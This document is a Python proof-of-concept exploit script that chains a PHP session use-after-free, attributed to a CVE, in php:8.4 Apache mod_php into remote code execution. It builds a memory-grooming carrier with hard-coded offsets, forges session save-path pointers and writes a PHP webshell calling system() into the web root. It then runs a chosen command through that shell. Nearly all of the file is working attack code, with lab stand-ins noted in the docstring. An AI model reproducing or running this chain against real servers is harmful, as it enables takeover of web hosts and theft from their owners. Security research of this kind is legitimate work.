#!/usr/bin/env python3 -I
# INDEX: single-request session-uaf file-write rce | apache | other(docker-exec arm) | session_start() | minor+ | armed worker, 128M
"""Single-request sink-free session-UAF -> file-write RCE on php:8.4.26-apache
(prefork mod_php). Apache port of the FPM stage; lands uid=33 pure-HTTP for the
stage, no runtime gdb, no multi-stage re-arm.

Composition (CVE-2026-109619; thin orchestration over the primitives): an armed worker has a
dangling BG(unserialize). One stage POST (write.basedir_write_stage) re-occupies the freed decoder
blocks with a carrier built from write.high_dt_slot_placement (fake basedir backing at a high DT
slot that survives php_session_encode) + write.ps_files_basedir_forge (the two-push aim at
ps_files->{last_key, basedir}); a trailing $_FILES part's FILE_START flush writes the session (a
webshell in an upload_progress key) to the forged NUL-truncated path.
oracles.upload_progress_output reads back GET x.php?0=<cmd>.

Groom: the 256 KB carrier first-fits AT the freed DT block via 2 tiny prefix $_POST fields, which sit
above d (d preserved). Field VALUES carry the NUL-bearing carrier/shell, so they are body fields, not
filenames (the raw-HTTP transport keeps values binary-safe; filenames drop NUL).

Offsets (128M Apache arm, chunk-relative, K-free): E_OFF=0x8e000 DT_OFF=0x69000 ps_files=K+0x561e0;
AIM = (ps_files - E - 0x10)/8 = -28614; CARRIER_E = E_OFF - DT_OFF = 0x25000; S=50.

Lab stand-ins (inherited; NOT the write-delivery): the arm session file is built by genA_big.php
(docker exec) -- the real attack accumulates it via upload-progress POSTs
(groom.upload_progress_accumulate) -- and sess_zc is a trivial 2-int normal session write
(file < memory_limit so s_read's whole-file alloc succeeds, then the decode OOMs -> dangle).
The cpapache-* rig is torn down, so this is kept for structural reference and is not runtime-verifiable.
"""
import os
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
from common import http_raw as H  # raw-HTTP transport  # noqa: E402
from primitives.write import ps_files_basedir_forge as forge  # noqa: E402
from primitives.geometry import carrier_e_gap  # noqa: E402
from primitives.write import high_dt_slot_placement  # noqa: E402
from primitives.write.basedir_write_stage import stage_parts  # noqa: E402
from primitives.oracles.upload_progress_output import webshell_output  # noqa: E402

C = os.environ.get("AP_CONT", "cpapache-port")
HOST, PORT = "127.0.0.1", int(os.environ.get("AP_PORT", "18726"))
SZ = 262144
NFIELD = int(os.environ.get("AP_NFIELD", "2"))
FLEN = int(os.environ.get("AP_FLEN", "50"))
FSIZE = 5000
S = int(os.environ.get("AP_S", "50"))
E_OFF, PS_FILES_OFF = 0x8e000, 0x561e0
DT_OFF = carrier_e_gap.dt_from_e(E_OFF, "dt_high_slot")   # 0x69000
CARRIER_E = carrier_e_gap.carrier_e("dt_high_slot")       # 0x25000
AIM_U = int(os.environ.get("AP_AIM", str(forge.aim_used_slots(PS_FILES_OFF, E_OFF))))  # -28614
WEBPATH = os.environ.get("AP_PATH", "/var/www/html/x.php").encode() + b"\x00"
SHELL = b"<?php system($_GET[0]);?>"
CMD = os.environ.get("AP_CMD", "id")
ATTEMPTS = int(os.environ.get("AP_ATTEMPTS", "6"))
# arm session sizing (file MUST be < memory_limit; the dangle GEOMETRY is limit-independent).
# NBIG per limit: 32M=5, 128M=20, 512M=100 (file ~ 0.6*limit).
NSMALL = os.environ.get("AP_NSMALL", "100")
NBIG = os.environ.get("AP_NBIG", "20")
FNLEN = os.environ.get("AP_FNLEN", "4000000")


def sh(c):
    return subprocess.run(["docker", "exec", C, "sh", "-c", c], capture_output=True, text=True)


def child_pid():
    return sh("ps -eo pid,ppid,comm | awk '/apache2/ && $2==1{print $1; exit}'").stdout.strip()


def wait_child():
    for _ in range(60):
        if child_pid():
            return True
        time.sleep(0.25)
    return False


def build_carrier():
    """Carrier for the armed worker: high-DT-slot placement of the fake basedir backing (survives
    php_session_encode) + the two-push aim at ps_files->{last_key, basedir}."""
    car = bytearray(SZ)
    high_dt_slot_placement.place(car, WEBPATH, s=S)
    forge.aim_pushes(car, CARRIER_E, AIM_U)
    return bytes(car)


def arm():
    sh("rm -f /sess/sess_asx /sess/sess_zc " + WEBPATH[:-1].decode())
    subprocess.run(["docker", "exec", C, "php", "-d", "memory_limit=-1",
                    "/genA_big.php", "asx", NSMALL, NBIG, FNLEN], capture_output=True)
    # warm so the arm is not the child's first request (startup residue shifts layout)
    H.get(HOST, PORT, "/pid.php")
    H.get(HOST, PORT, "/arm.php?sid=asx", cookie="PHPSESSID=asx")
    subprocess.run(["docker", "exec", "-i", C, "sh", "-c", "cat > /sess/sess_zc"],
                   input=b"a|i:0;b|i:0;", capture_output=True)
    sh("chmod 666 /sess/sess_zc")


def shot(car):
    if not wait_child():
        return False, "no child"
    arm()
    parts = stage_parts(car, SHELL, nfield=NFIELD, flen=FLEN, fsize=FSIZE)
    try:
        H.post_multipart(HOST, PORT, "/plain.php", parts, cookie="PHPSESSID=zc", timeout=30)
    except Exception as e:
        print("  post err", e)
    time.sleep(0.3)
    ls = sh("ls -la " + WEBPATH[:-1].decode() + " 2>&1").stdout.strip()
    return "No such" not in ls, ls


def main():
    car = build_carrier()
    print("[apache_rce] AIM_U=%d S=%d NFIELD=%d FLEN=%d path=%r"
          % (AIM_U, S, NFIELD, FLEN, WEBPATH[:-1].decode()))
    hit = False
    for a in range(1, ATTEMPTS + 1):
        ok, ls = shot(car)
        print("[apache_rce][attempt %d/%d] dropped: %s" % (a, ATTEMPTS, ls[:70]))
        if ok:
            hit = True
            break
    if not hit:
        print("[apache_rce] no shot landed the file")
        return
    out = H.get(HOST, PORT, "/x.php?0=" + CMD)
    print("=== webshell cmd=%r output ===" % CMD)
    print(webshell_output(H.body_of(out), tail=b"|a:5")[:400])


if __name__ == "__main__":
    main()
